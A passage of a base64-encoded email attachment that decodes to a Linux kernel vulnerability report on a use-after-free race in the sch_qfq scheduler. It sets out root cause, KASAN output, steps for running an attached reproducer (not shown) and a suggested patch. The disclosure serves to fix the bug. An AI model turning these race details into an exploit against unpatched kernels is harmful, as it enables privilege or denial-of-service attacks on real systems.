MDY5NjRlOTgxMQpodHRwczovL2dpdGh1Yi5jb20vdG9ydmFsZHMvbGludXgvY29tbWl0LzYyY2M5
MDI0MTU0OGQ1NTcwZWU2OGUwMWFhYmE2NTA2OTY0ZTk4MTEKClJlcXVpcmVkIGNvbmZpZ3VyYXRp
b246CgoqIENPTkZJR19ORVRfU0NIRUQKKiBDT05GSUdfTkVUX1NDSF9RRlEKClRoZSBhdHRhY2hl
ZCByZXByb2R1Y2VyIGFkZGl0aW9uYWxseSByZXF1aXJlczoKCiogQ09ORklHX1VTRVJfTlMKKiBD
T05GSUdfTkVUX05TCiogQ09ORklHX0lORVQKCktBU0FOIGlzIHJlY29tbWVuZGVkIHRvIG9ic2Vy
dmUgdGhlIGZpcnN0IGludmFsaWQgYWNjZXNzLgoKPT09PT09PT09PT0gUm9vdCBDYXVzZSA9PT09
PT09PT09PQoKVGhlIGNvbnRyb2wgcGF0aCBpczoKClJUTV9ORVdUQ0xBU1MKICB0Y19jdGxfdGNs
YXNzKCkKICAgIHFmcV9jaGFuZ2VfY2xhc3MoKQogICAgICBnZW5fcmVwbGFjZV9lc3RpbWF0b3Io
KQogICAgICBzY2hfdHJlZV9sb2NrKCkKICAgICAgcWZxX2ZpbmRfYWdnKCkKICAgICAgcWZxX2Rl
YWN0X3JtX2Zyb21fYWdnKCkKICAgICAgICBxZnFfcm1fZnJvbV9hZ2coKQogICAgICAgICAgcWZx
X2Rlc3Ryb3lfYWdnKCkKICAgICAgICAgICAga2ZyZWUoKQogICAgICBxZnFfYWRkX3RvX2FnZygp
CiAgICAgICAgcWZxX3VwZGF0ZV9hZ2coKQoKVGhlIGNvbXBldGluZyBwYWNrZXQgcGF0aCBpczoK
CnNlbmQoKQogIHFmcV9lbnF1ZXVlKCkKICAgIHFmcV9jaGFuZ2VfYWdnKCkKICAgICAgcWZxX2Zp
bmRfYWdnKCkKICAgICAgcWZxX2RlYWN0X3JtX2Zyb21fYWdnKCkKICAgICAgcWZxX2FkZF90b19h
Z2coKQoKRm9yIGFuIGV4aXN0aW5nIGNsYXNzLCBxZnFfY2hhbmdlX2NsYXNzKCkgZmlyc3Qgc25h
cHNob3RzIHRoZQphZ2dyZWdhdGUgdHVwbGUgd2hpbGUgaG9sZGluZyB0aGUgcWRpc2MgdHJlZSBs
b2NrOgoKfgpzY2hfdHJlZV9sb2NrKHNjaCk7Cm9sZF93ZWlnaHQgPSBjbC0+YWdnLT5jbGFzc193
ZWlnaHQ7Cm9sZF9sbWF4ID0gY2wtPmFnZy0+bG1heDsKc2NoX3RyZWVfdW5sb2NrKHNjaCk7Cn4K
Ckl0IHRoZW4gcGVyZm9ybXMgd29yaywgaW5jbHVkaW5nIGFuIG9wdGlvbmFsIGVzdGltYXRvciBy
ZXBsYWNlbWVudCwKd2l0aG91dCB0aGF0IGxvY2suIFRoZSBwYWNrZXQgcGF0aCBjYW4gcnVuIGR1
cmluZyB0aGlzIGludGVydmFsLiBJZiBhCnBhY2tldCBpcyBsYXJnZXIgdGhhbiB0aGUgY3VycmVu
dCBhZ2dyZWdhdGUncyBsbWF4LCBxZnFfZW5xdWV1ZSgpCmNhbGxzIHFmcV9jaGFuZ2VfYWdnKCkg
YW5kIG1vdmVzIHRoZSBjbGFzcyB0byBhbiBhZ2dyZWdhdGUgbWF0Y2hpbmcKdGhlIHBhY2tldCBs
ZW5ndGguCgpXaGVuIHRoZSBjb250cm9sIHBhdGggcmVzdW1lcywgaXQgc2VsZWN0cyBpdHMgcmVx
dWVzdGVkIGFnZ3JlZ2F0ZSBhbmQKdW5jb25kaXRpb25hbGx5IHJlcGxhY2VzIHRoZSBleGlzdGlu
ZyBjbGFzcydzIGFnZ3JlZ2F0ZToKCn4Kc2NoX3RyZWVfbG9jayhzY2gpOwpuZXdfYWdnID0gcWZx
X2ZpbmRfYWdnKHEsIGxtYXgsIHdlaWdodCk7Ci4uLgppZiAoZXhpc3RpbmcpCiAgICAgICAgcWZx
X2RlYWN0X3JtX2Zyb21fYWdnKHEsIGNsKTsKLi4uCnFmcV9hZGRfdG9fYWdnKHEsIG5ld19hZ2cs
IGNsKTsKfgoKVGhlIHJhY2Ugb2NjdXJzIHdoZW4gdGhlIHBhY2tldCBwYXRoIGhhcyBhbHJlYWR5
IG1vdmVkIHRoZSBjbGFzcyB0bwp0aGUgcmVxdWVzdGVkICh3ZWlnaHQsIGxtYXgpIHR1cGxlLiBJ
biB0aGF0IGNhc2UgcWZxX2ZpbmRfYWdnKCkKcmV0dXJucyBjbC0+YWdnOgoKfgpDUFUgMDogcWZx
X2NoYW5nZV9jbGFzcygpCiAgc25hcHNob3Qgb2xkIHR1cGxlICh3ZWlnaHQ9MSwgbG1heD01MTIp
CiAgcmVsZWFzZSBxZGlzYyB0cmVlIGxvY2sKICBnZW5fcmVwbGFjZV9lc3RpbWF0b3IoKQoKICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDUFUgMTogcWZxX2VucXVldWUoKQog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb2JzZXJ2ZSBwYWNrZXQgbGVu
Z3RoIDE1MDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHFmcV9jaGFu
Z2VfYWdnKDEsIDE1MDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBt
b3ZlIGNsYXNzIHRvIGFnZ3JlZ2F0ZSBCCgpDUFUgMDoKICBhY3F1aXJlIHFkaXNjIHRyZWUgbG9j
awogIG5ld19hZ2cgPSBxZnFfZmluZF9hZ2coMSwgMTUwMCkgIC8vIG5ld19hZ2cgPT0gY2wtPmFn
ZyA9PSBCCiAgcWZxX2RlYWN0X3JtX2Zyb21fYWdnKGNsKQogICAgcWZxX3JtX2Zyb21fYWdnKGNs
KQogICAgICBxZnFfZGVzdHJveV9hZ2coQikKICAgICAgICBrZnJlZShCKQogIHFmcV9hZGRfdG9f
YWdnKG5ld19hZ2csIGNsKSAgICAgIC8vIG5ld19hZ2cgcG9pbnRzIHRvIGZyZWVkIEIKfgoKRm9y
IGEgc2luZ2xldG9uIGFnZ3JlZ2F0ZSwgcWZxX3JtX2Zyb21fYWdnKCkgY2FsbHMKcWZxX2Rlc3Ry
b3lfYWdnKCkuIFRoZSBmaXJzdCBzdGFsZSBhY2Nlc3MgaXMgdGhlIHJlYWQgb2YKYWdnLT5udW1f
Y2xhc3NlcyBmcm9tIHFmcV9hZGRfdG9fYWdnKCk6Cgp+CmNsLT5hZ2cgPSBhZ2c7CnFmcV91cGRh
dGVfYWdnKHEsIGFnZywgYWdnLT5udW1fY2xhc3NlcyArIDEpOwp+CgpxZnFfdXBkYXRlX2FnZygp
IHRoZW4gcGVyZm9ybXMgYWRkaXRpb25hbCByZWFkcyBhbmQgd3JpdGVzIHRocm91Z2gKdGhlIGZy
ZWVkIGFnZ3JlZ2F0ZS4gVGhlIGF0dGFjaGVkIEtBU0FOIG91dHB1dCByZXBvcnRzOgoKfgpCVUc6
IEtBU0FOOiBzbGFiLXVzZS1hZnRlci1mcmVlIGluIHFmcV9hZGRfdG9fYWdnClJlYWQgb2Ygc2l6
ZSA0Ci4uLgpGcmVlZCBieToKICBxZnFfcm1fZnJvbV9hZ2cKICBxZnFfY2hhbmdlX2NsYXNzCi4u
LgpLZXJuZWwgcGFuaWMgLSBub3Qgc3luY2luZzogRmF0YWwgZXhjZXB0aW9uIGluIGludGVycnVw
dAp+Cgo9PT09PT09PT09IFJlcHJvZHVjdGlvbiA9PT09PT09PT09CgoxLiBCdWlsZCBMaW51eCBh
dCA4MmE0NzU4NmMwYjkyNjY2MjI2NTcwMDlhYTMwNTczZGRkZjA5ZjUzCiAgIHdpdGggdGhlIGNv
bmZpZ3VyYXRpb24gb3B0aW9ucyBsaXN0ZWQgYWJvdmUgYW5kIEtBU0FOIGVuYWJsZWQuCiAgIFVz
ZSBhIHN5c3RlbSB3aXRoIGF0IGxlYXN0IHR3byBDUFVzLiBJZiBRRlEgaXMgY29uZmlndXJlZCBh
cyBhCiAgIG1vZHVsZSwgbWFrZSBzY2hfcWZxIGF2YWlsYWJsZSBiZWZvcmUgcnVubmluZyB0aGUg
cmVwcm9kdWNlci4KCjIuIEJ1aWxkIHRoZSBhdHRhY2hlZCBwb2MuYzoKCn4KZ2NjIC1zdGF0aWMg
LU8yIC1wdGhyZWFkIC1XYWxsIC1XZXh0cmEgLW8gcG9jIHBvYy5jCn4KCjMuIFJ1biB0aGUgcmVz
dWx0aW5nIGJpbmFyeToKCn4KLi9wb2MKfgoKVGhlIHJlcHJvZHVjZXIgY3JlYXRlcyB1c2VyIGFu
ZCBuZXR3b3JrIG5hbWVzcGFjZXMsIGJyaW5ncyB1cCB0aGUKbG9vcGJhY2sgZGV2aWNlLCBpbnN0
YWxscyBhIFFGUSBxZGlzYyBhbmQgY2xhc3MsIGFuZCByYWNlcyBjbGFzcwpjaGFuZ2VzIGFnYWlu
c3QgcGFja2V0IGVucXVldWUuIFJhY2UgdGltaW5nIHZhcmllcyBiZXR3ZWVuIHN5c3RlbXMuCk9u
IHRoZSB2YWxpZGF0ZWQgS0FTQU4ga2VybmVsLCB0aGUgZXhwZWN0ZWQgcmVzdWx0IGlzIGEKc2xh
Yi11c2UtYWZ0ZXItZnJlZSByZXBvcnQgaW4gcWZxX2FkZF90b19hZ2coKSwgZm9sbG93ZWQgYnkg
YSBrZXJuZWwKcGFuaWMuIFRoZSBmdWxsIG9ic2VydmVkIG91dHB1dCBpcyBhdHRhY2hlZCBhcyBz
cGxhc2gudHh0LgoKPT09PT09PT09IFN1Z2dlc3RlZCBQYXRjaCA9PT09PT09PQoKVGhlIGF0dGFj
aGVkIHBhdGNoLAowMDAxLW5ldC1zY2hlZC1zY2hfcWZxLXByZXZlbnQtYWdncmVnYXRlLXNlbGYt
cmVwbGFjZW1lbnQucGF0Y2gsCmNoZWNrcyBuZXdfYWdnIGFnYWluc3QgY2wtPmFnZyB3aGlsZSB0
aGUgcWRpc2MgdHJlZSBsb2NrIGlzIGhlbGQuIElmCnRoZSBwYWNrZXQgcGF0aCBoYXMgYWxyZWFk
eSBtb3ZlZCB0aGUgY2xhc3MgdG8gdGhlIHJlcXVlc3RlZAphZ2dyZWdhdGUsIHFmcV9jaGFuZ2Vf
Y2xhc3MoKSBza2lwcyB0aGUgcmVkdW5kYW50IHJlbW92YWwgYW5kCnJlLWFkZGl0aW9uLiBBbnkg
cmVxdWVzdGVkIGVzdGltYXRvciByZXBsYWNlbWVudCBoYXMgYWxyZWFkeQpjb21wbGV0ZWQsIHNv
IHRoZSBvcGVyYXRpb24gY2FuIG90aGVyd2lzZSBmaW5pc2ggbm9ybWFsbHkuCgpUaGUgY2hhbmdl
IGFmZmVjdHMgb25seSB0aGlzIHNlbGYtcmVwbGFjZW1lbnQgY2FzZS4gQWdncmVnYXRlCm1pZ3Jh
dGlvbnMgdG8gYSBkaWZmZXJlbnQgb2JqZWN0IGFuZCBuZXcgY2xhc3MgY3JlYXRpb24gcmV0YWlu
IHRoZWlyCmV4aXN0aW5nIGJlaGF2aW9yLgoKVGhlIHBhdGNoOgoKKiBhcHBsaWVzIGNsZWFubHkg
dG8gZjUwOThiNmJhZTc2MWUzNDZlYmNkOWRhN2Y5NTYyMmMwNDczM2NmZjsKKiBwYXNzZXMgc2Ny
aXB0cy9jaGVja3BhdGNoLnBsIC0tc3RyaWN0IHdpdGggbm8gd2FybmluZ3Mgb3IgZXJyb3JzOwoq
IGJ1aWxkcyBzdWNjZXNzZnVsbHkgd2l0aCB0aGUgc3VwcGxpZWQgY29uZmlndXJhdGlvbiB1c2lu
ZzoKCn4KbWFrZSAtajggTT1uZXQvc2NoZWQgbW9kdWxlcwp+Cgo9PT09PT09PT09PSBEaXNjbGFp
bWVyID09PT09PT09PT09CgpUaGlzIGluZm9ybWF0aW9uIGlzIGJlaW5nIHNoYXJlZCBieSBPcGVu
QUkgc29sZWx5IGZvciB0aGUgcHVycG9zZSBvZgppbXByb3Zpbmcgc2VjdXJpdHkgYW5kIHJlZHVj
aW5nIHBvdGVudGlhbCBoYXJtLiBUaGlzIGluZm9ybWF0aW9uIGlzCnByZXNlbnRlZCBhcy1pcy4g
V2UgbWFrZSBubyByZXByZXNlbnRhdGlvbnMgb3Igd2FycmFudGllcywgZXhwcmVzcyBvcgppbXBs
aWVkLCBhcyB0byB0aGUgY29tcGxldGVuZXNzLCBhY2N1cmFjeSwgb3IgZml0bmVzcyBmb3IgYW55
CnBhcnRpY3VsYXIgcHVycG9zZSBvZiB0aGUgaW5mb3JtYXRpb24uIFRoaXMgaW5jbHVkZXMsIHdp
dGhvdXQKbGltaXRhdGlvbiBhbnkgc3VnZ2VzdGlvbnMgb3IgaWRlYXMgcHJlc2VudGVkIG9uIGhv
dyB0byByZW1lZHkgb3IKbWl0aWdhdGUgYW4gaWRlbnRpZmllZCB2dWxuZXJhYmlsaXR5LCBpbmNs
dWRpbmcgd2hldGhlciBzdWNoCnN1Z2dlc3Rpb25zIG9yIGlkZWFzIHdvdWxkIGJlIGVmZmVjdGl2
ZSBhbmQvb3IgY291bGQgaGF2ZSBvdGhlcgpuZWdhdGl2ZSBpbXBhY3RzLgoKT3BlbkFJIGRpc2Ns
YWltcyBhbnkgbGlhYmlsaXR5IGZvciBkaXJlY3Qgb3IgaW5kaXJlY3QgZGFtYWdlcyBhcmlzaW5n
CmZyb20gdGhlIHJlbGlhbmNlIG9uLCBvciB1c2UsIG1pc3VzZSwgb3IgaW50ZXJwcmV0YXRpb24g
b2YgdGhpcwppbmZvcm1hdGlvbi4gQW55IHJlZmVyZW5jZXMgdG8gdGhpcmQtcGFydHkgc3lzdGVt
cywgc2VydmljZXMsIG9yCmVudGl0aWVzIGFyZSBpbmNsdWRlZCBzb2xlbHkgZm9yIGlkZW50aWZp
Y2F0aW9uIHB1cnBvc2VzIGFuZCBkbyBub3QKaW1wbHkgZW5kb3JzZW1lbnQsIHJlc3BvbnNpYmls
aXR5LCBvciBhdHRyaWJ1dGlvbi4K
--000000000000164bd3065e83df67--
